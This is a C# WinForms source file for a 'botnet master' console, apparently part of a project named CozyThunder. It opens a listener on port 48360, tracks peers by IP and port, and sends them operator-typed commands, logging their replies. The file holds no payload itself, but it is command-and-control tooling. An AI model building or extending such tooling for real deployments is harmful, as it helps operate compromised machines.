using CozyThunder.Botnet.Interface;
using CozyThunder.Botnet.Master;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using CozyThunder.Botnet.Common;
using System.Net;

namespace CozyThunder.Botnet.MasterGui
{
    public partial class MasterForm : Form, IMasterPeerListener
    {
        MasterPeer master = new MasterPeer();

        public MasterForm()
        {
            InitializeComponent();
            master.Start(IPAddress.Any, 48360, this);
        }

        Peer currentSelect()
        {
            var ss = listView1.SelectedItems;
            if (ss.Count > 0)
            {
                var s = ss[0];
                var ts = s.Text.Split(':');
                if (ts.Count() == 2)
                {
                    var peer = new Peer() { EndPoint = new IPEndPoint(IPAddress.Parse(ts[0]), int.Parse(ts[1])) };
                    return peer;
                }
            }
            return null;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            var p = currentSelect();
            if (p != null)
            {
                string s = "send - " + textBox1.Text;
                listBox1.Items.Add(s);
                listBox1.SelectedIndex = listBox1.Items.Count - 1;
                master.Send(p, textBox1.Text);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var ip = textBox2.Text;
            var port = textBox3.Text;
            listView1.Items.Add(ip + port, ip + ":" + port, 0);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            ListView.SelectedListViewItemCollection ss = listView1.SelectedItems;
            if (ss.Count > 0)
            {
                foreach (ListViewItem i in ss)
                {
                    i.Remove();
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            var p = currentSelect();
            if (p != null)
            {
                master.Connect(p);
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            var p = currentSelect();
            if (p != null)
            {
                master.DisConnect(p);
            }
        }

        public void OnConnect(Peer peer)
        {
            listBox1.Items.Add("OnConnect - " + peer.EndPoint.ToString());
            listBox1.SelectedIndex = listBox1.Items.Count - 1;
        }

        public void OnDisConnect(Peer peer)
        {
            listBox1.Items.Add("OnDisConnect - " + peer.EndPoint.ToString());
            listBox1.SelectedIndex = listBox1.Items.Count - 1;
        }

        public void OnMessage(Peer peer, byte[] msg)
        {
            listBox1.Items.Add("OnMessage - " + peer.EndPoint.ToString());
            listBox1.Items.Add(msg);
            listBox1.SelectedIndex = listBox1.Items.Count - 1;
        }
    }
}
